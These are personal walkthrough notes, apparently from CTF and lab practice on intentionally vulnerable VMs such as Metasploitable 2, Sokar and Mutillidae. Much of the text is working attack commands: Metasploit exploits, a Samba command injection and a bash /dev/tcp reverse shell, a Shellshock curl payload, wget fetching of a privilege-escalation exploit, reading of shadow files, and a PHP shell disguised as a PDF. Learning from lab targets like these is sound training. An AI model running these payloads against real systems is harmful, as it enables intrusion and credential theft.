#+TAGS: sec ctf


* Vuln Boxes							    :sec:ctf:
* Boxes
** Metasploitable
** Metasploitable 2
*** Walk Through with RWB on youtube
https://www.youtube.com/watch?v=JGUoOotVXNQ
**** Enumeration
- netdiscover
#+BEGIN_SRC sh
netdiscover -r 192.168.56.0/24
#+END_SRC

- nmap of results from above
#+BEGIN_SRC sh
nmap -sV -p-65535 192.168.56.102
#+END_SRC

- open port 21 - decides to use telnet to confirm service
#+BEGIN_SRC sh
telent 192.168.0.102 21
#+END_SRC

- nmap udp scan
#+BEGIN_SRC sh
nmap -sU 192.168.0.102
#+END_SRC

**** Telnet
Setting up wireshark to capture a telnet session login will allow the password to be caught.
To view the session right click the packet in wire shack and slect follow tcp stream.

**** VSFTP
First determine the version, and then research known exploits

- Using metasploit 
does metasploit have any exploits for vsftp
> search vsftp
> use exploit/unix/ftp/vsftpd_234_backdoor
> set rhost 192.168.0.102
> exploit
no prompt to acknowledge the shell
- use the shell access to view /etc/passwd and /etc/shadow to grab users and password hashes
  
hash-identifier - this can be used on the found hashes to id the hash type

Johnny - jtr gui
  - create a file of the user and hases - uesr:hash*$ksjflsQ
    
- Using Manual Exploit
The above exploit can be performed manually
> ftp 192.168.0.102
Name (192.168.56.102:root): a:)

The above has created a backdoor on port 6200
Use netcat to access the backdoor
> nc -vvn 192.168.0.56.102 6200

this will provide root shell

**** Samba
nmap shows that samba is running on 139 and 445
  
using metasploit aux module
> use auxiliary/scanner/smb/smb_version
> set rhosts 192.168.56.102
> run
this should return the version if available

- using metasploit
> search samba
> use exploit/multi/samba/usermap_script
> set rhost 192.168.56.102
> exploit
this should create a shell on the machone if it's vulnerable

- manually
using smbclient - similar in acton as ftp client
> smbclient //metasploitable/tmp
this should provide an anonymous user smb shell
on the host machine use netcat to set up a listner
> nc -lvnp 4444
on the smb shell
> logon "/=`nc 192.168.56.101 4444 -e /bin/bash`"
should now have a shell connected to the listner

**** DISTCC (Distributed C code across serveral machines on a network for compilation)
Exploits used
http://www.exploit-db.com/exploits/9915
https://www.exploit-db.com/exploits/8572/

nmap shows that dsitccd is running on port 3632 and the version is v1

nmap nse script for distcc version
#+BEGIN_SRC sh
nmap -p 3632 192.168.56.102 --script=distcc-cve2004-2687 --script-agree="distcc-cve2004-2687.cmd='uname -a'"
#+END_SRC
this should return the output of the cmd

- using metasploit
> search distcc
> use exploit/unix/misc/distcc_exec
> set rhost 192.168.56.102
> exploit
Unlike above this will create an interactive shell, not just a single cmd
using ps you can find if there is any other vectors to exploit
on this machine there is a udev exploit available
using searchsploit you can then check if udev has any know exploits
> searchsploit udev
this brings back an exploit linux/local/8572.c
this needs to be put on the targets machine
This can be done by hosting the file on apache
> service apache2 start
> cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www/html
now on the target use wget to pull the file
> cd /tmp
> wget 192.168.56.101/8572.c -O msp2.c
> touch run
> echo '#!/bin/sh' > run
> echo '/bin/netcat -e /bin/sh 192.168.56.101 5555' >> run
> gcc msp2.c -o msp2
> cat /proc/net/netlink
note the pid (2344)
on host run netcat listner
> nc -lvnp 5555
on target
> chmod +x msp2 
> ./msp2 2344
Should now have a root shell on the netcat listner

**** IngresLock Vuln
Simple vuln that only requires telnet
> telnet 192.168.56.102 1524
that is it, should now have a root shell

*** [[https://www.youtube.com/watch?v%3D0fbBwGAuINw][How to Exploit Metasploitable 2 with NMap, Nexpose, Nessus and Metasploit]]
- getting a html report from nmap report
#+BEGIN_SRC sh
nmap -O -sV -sC -oX nmap-scan.xml 192.168.56.101
cp /usr/share/nmap/nmap.xsl .
#+END_SRC
We need the nmap.xsl as it is the stylesheet for the xml file

- Vulnerability Scanners
  - OpenVAS
  - Nessus
  - Nexpose
** Sokar 1
VulnHub: [[https://www.vulnhub.com/?q%3Dsokar&sort%3Ddate-asc&type%3Dvm][Sokar 1]]
*** HackHappy Walkthrough
+ Enumeration
- netdiscover to find the server

- nmap on the server
#+BEGIN_SRC sh
nmap -sV -p- 192.168.56.102
#+END_SRC
This found an open port on 591

- http://192.168.56.102:591 - this takes you to a stats page
  
- gobuster is then used for more info
#+BEGIN_SRC sh
gobuster -w /usr/share/wordlists/dirb/All.txt -u http://192.168.56.102:591 -t 50
#+END_SRC
-t is number of threads

- nikto
#+BEGIN_SRC sh
nikto -h http://192.168.56.102:591
#+END_SRC

- found a /cgi-bin
- this confirms that the script is regualrly  updating, and confirms that it's the server output
  - this indicates a cron job
    
- attempt [[file://home/crito/org/tech/security/exploits/shellshock.org][Shellshock]]
#+BEGIN_SRC sh
curl -H "user-agent: () {:;}; echo; echo; /bin/bash -c 'id;;" http://192.168.56.102:591/cgi-bin/cat
#+END_SRC
this indicates that shell shock works and we can execute cmds as apache

- create a script with the above for convenience
c.sh
#+BEGIN_SRC sh
#! /bin/bash
curl -H "user-agent: () {:;}; echo; echo; /bin/bash -c '$1 $2 $3 $4 $5;'" http://192.168.56.102:591/cgi-bin/cat
#+END_SRC
- ./c.sh id
  - this will now perform the id cmd on the server
    
- viewing the home directories a user called bynarr has it set to 777
  - in the bash_profile this PATH=.:$PATH:$HOME/bin
    - the . in the PATH means that cmds can be executed from the home dir without the ./

- create a reverse shell from bynarr's home directory
  - on host
#+BEGIN_SRC sh
nc -l -p 51242
#+END_SRC
  - using the script from before
#+BEGIN_SRC sh
./c.sh '/bin/echo -e "bash -i >& /dev/tcp/192.168.56.101/51242 0>&1" > /home/bynarr/iostat'
#+END_SRC
  
- with the new shell check for sudo privs
#+BEGIN_SRC sh
sudo -l
#+END_SRC

- this indicates that we can use the script /home/bynarr/lime
  - this is a linux memory extractor
  - when run, and add is used it prints a file to the /tmp
    
- use grep, looking for root
#+BEGIN_SRC sh
grep root ram
#+END_SRC
this found the hash for the root acct

- also there was the other two accts hashes available in the file
  - apophis - was cracked to be overdrive
    
- as the reverse shell isn't a tty we can use
#+BEGIN_SRC sh
python -c 'import pty; pty.spawn("/bin/sh")'
#+END_SRC
will now be able to use su and become apophis

- inside of apophis is a file build.
  - then run it indicates that it tries but fails to connect to a repo
  - indication of version control, git is running on the machine 
    - looking at the version it appears there's a vuln

- to take advantage of the vuln in git we need to inpersonate sokar-dev, the dev server that build tries to connect to
  - walk through ended here as unable to edit /etc/hosts needed root priv
    
- I think that the .git file should have been looked for and edited the config to point to our host machine

** Mutillidae II
*** [[https://www.youtube.com/watch?v%3DCYsiNYeAS6U][Introduction to OWASP Mutillidae II Web Pen Testing Environment - Jeremy Druin]]
- is contained in Metasploit2
  
- Besides "hints" and "bubble hints" there is a file with 1,000+ lines of pre-tested hacks against various pages
  - <directory>/mutillidae/documentation/mutillidae-test-scripts.txt
*** [[https://www.youtube.com/watch?v%3D2ngGLMgjRVU][Web Pen-Testing Workshop - Part 2 - SQL Injection]]
*** [[https://www.youtube.com/watch?v%3Du3Wf_3SI_zE][Web Pen-Testing Workshop - Part 3 - Uploading Web Shells via SQL Injections]]
- null is used as it casts its self as any data type
- [[file://home/crito/org/tech/security/security_tools/laudanum.org][Laudanum]] is a tool that is useful for creating web shells

*** [[https://www.youtube.com/watch?v%3D4aGIrbC1tCk][Web Pen-testing Workshop - Part 4 - Auth Bypass via SQLi & Cookie Tampering]]
*** [[https://www.youtube.com/watch?v%3D0fODWaeupV0&t%3D5s][Web Pen-testing Workshop - Part 5 - Local/Remote File Inclusion]]
    
** SkyDog
VulnHub: [[http://download.vulnhub.com/skydog][SkyDogCTF]]
*** [[https://www.youtube.com/watch?v%3Dk1iFjyrsQqI][SkyDog CTF - RWBNetSec]]
- viewing image data with exiftool
- crack zip passwords with fcrackzip
- if a file is set root:root 777 with os.system() this can be used for priv escal
  - change contents of os.system('chmod u+s /bin/sh')

** De-ICE S1.110
VlunHub: [[https://www.vulnhub.com/?q%3Dde-ice&sort%3Ddate-asc&type%3Dvm][De-ICE]]
*** [[https://www.youtube.com/watch?v%3DoLM6L1_LYV0][Walkthrough De-ICE - HackHappy]]
- Inside the coredump was a copy of the shadow file

** Pentester Lab: PHP include And Post Exploitation
- file extension work around
  - adding the ?page=/../etc/passwd%00
    
- mime checking 
  - this can be fooled be creating a file that contains what the check expects
  - mime check looks at the header
#+BEGIN_SRC sh
%PDF-1.3
<?php system("id;whoami"); ?>
#+END_SRC

- now find where the file is being uploaded to
  - dirbuster
  - uploads
opening this file will not do anything, we need it to run throught the php parser    

- open the file from the search bar using the ?page=uploads/paper.pdf%00
  - this is now executed throught the php parser
    
** Wallaby's Nightmare
- php nuke rocket

* Links
